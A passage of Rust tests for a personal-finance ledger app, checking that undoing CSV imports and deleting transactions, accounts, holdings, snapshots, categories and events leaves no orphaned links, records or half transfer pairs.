    assert_eq!(ids_in_batch(db, w.b_batch.batch_id).len(), 3);
    assert_eq!(ids_in_batch(db, w.c.batch_id).len(), 2);
    assert_eq!(
        ids(db, "SELECT id FROM import_batch"),
        BTreeSet::from([w.b_batch.batch_id, w.c.batch_id])
    );
    assert_eq!(
        one::<i64>(
            db,
            "SELECT count(*) FROM txn WHERE import_batch_id IS NULL",
            []
        ),
        2
    );
    assert_eq!(one::<i64>(db, "SELECT count(*) FROM account", []), 2);
    assert!(w.joint > 0);
    w.b.assert_intact();

    // Documented: undo does not remember fingerprints, so loading the same
    // file again brings every row back. That is the point of removing it.
    assert_eq!(one::<i64>(db, "SELECT count(*) FROM txn_removed", []), 0);
    let again = import(
        db,
        w.main,
        "january.csv",
        vec![
            row("2026-01-03", "STREAMFLIX", -1299),
            row("2026-01-05", "ELECTRA ENERGY", -8000),
            row("2026-01-07", "ACME PAYROLL", 285_000),
            row("2026-01-09", "CORNER BAKERY", -450),
        ],
    );
    // Every row of the file comes back (one may collide with a typed row).
    assert!(again.inserted >= 3, "{}", again.inserted);
}

#[test]
fn undoing_without_everything_keeps_what_the_person_has_worked_on() {
    let w = three_imports();
    let db = w.b.db();
    let housing = category(db, "Housing");
    let first_of_a = *ids_in_batch(db, w.a.batch_id).iter().next().unwrap();
    txn_update(
        w.b.st(),
        first_of_a,
        TxnEdit {
            category_id: Some(housing),
            ..no_edit()
        },
    )
    .unwrap();
    let everything_else = ids(
        db,
        &format!(
            "SELECT id FROM txn WHERE import_batch_id IS NOT {}",
            w.a.batch_id
        ),
    );

    let removed = runner::undo(db, w.a.batch_id, false).unwrap();

    assert_eq!(removed, 3, "only the untouched rows go");
    let left = ids(db, "SELECT id FROM txn");
    let mut expected = everything_else;
    expected.insert(first_of_a);
    assert_eq!(left, expected);
    // The kept row is detached from a batch that no longer exists.
    let batch: Option<i64> = one(
        db,
        "SELECT import_batch_id FROM txn WHERE id = ?1",
        [first_of_a],
    );
    assert_eq!(batch, None);
    w.b.assert_intact();
}

#[test]
fn undoing_a_batch_that_is_not_there_changes_nothing() {
    let w = three_imports();
    let db = w.b.db();
    let before = ids(db, "SELECT id FROM txn");
    for id in [0, -1, 9_999, i64::MAX, i64::MIN] {
        for everything in [false, true] {
            assert_eq!(runner::undo(db, id, everything).unwrap(), 0, "batch {id}");
        }
    }
    assert_eq!(ids(db, "SELECT id FROM txn"), before);
    assert_eq!(one::<i64>(db, "SELECT count(*) FROM import_batch", []), 3);
}

#[test]
fn undoing_an_import_whose_bill_was_refunded_from_another_does_not_fail() {
    let w = three_imports();
    let db = w.b.db();
    let bill = id_of(db, "ELECTRA ENERGY", w.main);
    let refund = id_of(db, "ELECTRA ENERGY REFUND", w.main);
    // Linking marks the refund as worked on. The bill itself is untouched.
    txn_link_reimbursement(w.b.st(), Some(bill), refund).unwrap();

    let removed = runner::undo(db, w.a.batch_id, false)
        .expect("undo of an import with a refunded bill failed");
    assert!(removed >= 1);
    let still: i64 = one(db, "SELECT count(*) FROM txn WHERE id = ?1", [refund]);
    assert_eq!(still, 1, "the refund is a separate row and stays");
    assert_eq!(orphans(db), Vec::<String>::new());
}

/* ------------------------------------------------ nothing left behind -- */

#[test]
fn deleting_transactions_unlinks_what_hung_off_them_and_forgets_their_decisions() {
    let w = three_imports();
    let db = w.b.db();
    let bill = id_of(db, "ELECTRA ENERGY", w.main);
    let refund = id_of(db, "ELECTRA ENERGY REFUND", w.main);
    let payroll = id_of(db, "ACME PAYROLL", w.joint);
    txn_link_reimbursement(w.b.st(), Some(bill), refund).unwrap();
    // Decisions that point at both ends of pairs.
    let (lo, hi) = (bill.min(refund), bill.max(refund));
    exec(
        db,
        "INSERT INTO match_decision (kind, txn_lo_id, txn_hi_id, decision)
         VALUES ('split', ?1, ?2, 'confirmed')",
        params![lo, hi],
    );
    let (lo, hi) = (bill.min(payroll), bill.max(payroll));
    exec(
        db,
        "INSERT INTO match_decision (kind, txn_lo_id, txn_hi_id, decision)
         VALUES ('transfer', ?1, ?2, 'rejected')",
        params![lo, hi],
    );

    let n = db.with(|c| ledger::delete(c, &[bill])).unwrap();

    assert_eq!(n, 1);
    // The refund is its own row again.
    let link: (Option<i64>, Option<String>) = db
        .with(|c| {
            Ok(c.query_row(
                "SELECT parent_txn_id, link_kind FROM txn WHERE id = ?1",
                [refund],
                |r| Ok((r.get(0)?, r.get(1)?)),
            )?)
        })
        .unwrap();
    assert_eq!(link, (None, None));
    assert_eq!(one::<i64>(db, "SELECT count(*) FROM match_decision", []), 0);
    assert_eq!(one::<i64>(db, "SELECT count(*) FROM txn_removed", []), 1);
    assert_eq!(orphans(db), Vec::<String>::new());
    // And the other account's row with the same words is untouched.
    assert_eq!(
        one::<i64>(db, "SELECT count(*) FROM txn WHERE id = ?1", [payroll]),
        1
    );
}

#[test]
fn deleting_an_account_with_its_imports_and_memories_leaves_nothing_pointing_at_it() {
    // No screen deletes an account today, but the schema is the promise. This
    // is the account delete without a reimbursement link in it (with one, see
    // the ignored finding above).
    let w = three_imports();
    let db = w.b.db();
    let housing = category(db, "Housing");
    exec(
        db,
        "INSERT INTO txn_removed (account_id, dedupe_hash) VALUES (?1, 'gone')",
        params![w.main],
    );
    exec(
        db,
        "INSERT INTO categorization_rule (name, match_kind, pattern, account_id, set_category_id)
         VALUES ('only here', 'contains', 'x', ?1, ?2)",
        params![w.main, housing],
    );
    let joint_rows = ids(
        db,
        &format!("SELECT id FROM txn WHERE account_id = {}", w.joint),
    );

    exec(db, "DELETE FROM account WHERE id = ?1", params![w.main]);

    assert_eq!(
        ids(db, "SELECT id FROM txn"),
        joint_rows,
        "only the other account's rows are left"
    );
    assert_eq!(
        ids(db, "SELECT id FROM import_batch"),
        BTreeSet::from([w.c.batch_id])
    );
    assert_eq!(one::<i64>(db, "SELECT count(*) FROM txn_removed", []), 0);
    assert_eq!(
        one::<i64>(db, "SELECT count(*) FROM categorization_rule", []),
        0
    );
    w.b.assert_intact();
}

#[test]
fn deleting_a_holding_takes_its_movements_prices_schedule_and_balance_lines() {
    let b = Book::new();
    let keep = holding_save(
        b.st(),
        None,
        "Keep".into(),
        Some("KEEP".into()),
        "equities".into(),
    )
    .unwrap();
    let gone = holding_save(
        b.st(),
        None,
        "Gone".into(),
        Some("GONE".into()),
        "equities".into(),
    )
    .unwrap();
    for h in [keep, gone] {
        exec(
            b.db(),
            "INSERT INTO holding_txn (holding_id, on_date, kind, amount_minor, units_e8)
             VALUES (?1, '2026-01-06', 'buy', 100000, 100000000)",
            params![h],
        );
        exec(
            b.db(),
            "INSERT INTO holding_price (holding_id, on_date, price_micro) VALUES (?1, '2026-01-06', 1000000)",
            params![h],
        );
        exec(
            b.db(),
            "INSERT INTO holding_schedule (holding_id, amount_minor, every_days, start_date)
             VALUES (?1, 5000, 30, '2026-01-01')",
            params![h],
        );
    }
    b.db()
        .with(|c| sync_snapshot(c, day("2026-02-15")).map(|_| ()))
        .unwrap();
    assert_eq!(
        one::<i64>(
            b.db(),
            "SELECT count(*) FROM wealth_line WHERE source = 'holding'",
            []
        ),
        2
    );

    holding_delete(b.st(), gone).unwrap();

    for t in ["holding_txn", "holding_price", "holding_schedule"] {
        let n: i64 = one(
            b.db(),
            &format!("SELECT count(*) FROM {t} WHERE holding_id = ?1"),
            [gone],
        );
        assert_eq!(n, 0, "{t} still has rows for the holding");
        let kept: i64 = one(
            b.db(),
            &format!("SELECT count(*) FROM {t} WHERE holding_id = ?1"),
            [keep],
        );
        assert!(kept >= 1, "{t} lost the other holding's rows");
    }
    assert_eq!(
        column(
            b.db(),
            "SELECT label FROM wealth_line WHERE source = 'holding'"
        ),
        ["Keep"]
    );
    b.assert_intact();
}

#[test]
fn deleting_a_snapshot_a_category_and_an_event_leaves_the_rest_whole() {
    let b = Book::new();
    let acct = account(&b, "Main");
    let food = category(b.db(), "Food & groceries");
    let leisure = category(b.db(), "Leisure & travel");
    let extra = category_save(b.st(), None, "Gone".into(), "expense".into(), None).unwrap();
    let event = event_save(
        b.st(),
        None,
        EventInput {
            name: "Trip".into(),
            default_category_id: extra,
            starts_on: None,
            ends_on: None,
            budget_minor: None,
            notes: None,
        },
    )
    .unwrap();
    import(
        b.db(),
        acct,
        "m.csv",
        vec![row("2026-03-01", "HOTEL", -9000)],
    );
    let txn = id_of(b.db(), "HOTEL", acct);
    txn_update(
        b.st(),
        txn,
        TxnEdit {
            category_id: Some(extra),
            project_id: Some(event),
            ..no_edit()
        },
    )
    .unwrap();
    b.db()
        .with(|c| budget::save(c, extra, "2026", 100_000))
        .unwrap();
    let snap = snapshot_save(
        b.st(),
        None,
        SnapshotInput {
            taken_on: "2026-03-31".into(),
            label: None,
            lines: vec![WealthLine {
                id: None,
                bucket: "cash".into(),
                label: "Current".into(),
                gross_value_minor: 1,
                debt_minor: 0,
                currency: "EUR".into(),
                source: "manual".into(),
            }],
        },
    )
    .unwrap();

    snapshot_delete(b.st(), snap).unwrap();
    assert_eq!(
        one::<i64>(b.db(), "SELECT count(*) FROM wealth_line", []),
        0
    );

    // The event goes first, as the screen does: its transactions are freed.
    b.st().db().unwrap(); // (the handle is reusable; nothing is consumed)
    exec(
        b.db(),
        "DELETE FROM project_event WHERE id = ?1",
        params![event],
    );
    let project: Option<i64> = one(b.db(), "SELECT project_id FROM txn", []);
    assert_eq!(project, None);

    // A category in use cannot be deleted without somewhere to move its rows;
    // with one, the transaction moves and the category's budget goes with it.
    let refused = category_delete(b.st(), extra, None);
    assert!(matches!(refused, Err(AppError::Invalid(_))), "{refused:?}");
    category_delete(b.st(), extra, Some(leisure)).unwrap();
    let moved: Option<i64> = one(b.db(), "SELECT category_override_id FROM txn", []);
    assert_eq!(moved, Some(leisure));
    assert_eq!(one::<i64>(b.db(), "SELECT count(*) FROM budget", []), 0);
    assert!(food > 0);
    b.assert_intact();
}

#[test]
fn removing_one_leg_of_a_transfer_leaves_no_half_a_pair_behind() {
    let w = three_imports();
    let db = w.b.db();
    let out = id_of(db, "ELECTRA ENERGY", w.main);
    let inn = id_of(db, "ELECTRA ENERGY REFUND", w.main);
    exec(
        db,
        "UPDATE txn SET is_neutral_transfer = 1, transfer_group_id = 'tg-1', needs_review = 0
         WHERE id IN (?1, ?2)",
        params![out, inn],
    );

    // Taking the January statement back removes `out` and leaves `inn`.
    runner::undo(db, w.a.batch_id, true).unwrap();

    let lonely: i64 = one(
        db,
        "SELECT count(*) FROM (SELECT transfer_group_id FROM txn
                                WHERE transfer_group_id IS NOT NULL
                                GROUP BY transfer_group_id HAVING count(*) < 2)",
        [],
    );
    assert_eq!(lonely, 0, "a transfer group with a single member is left");
}
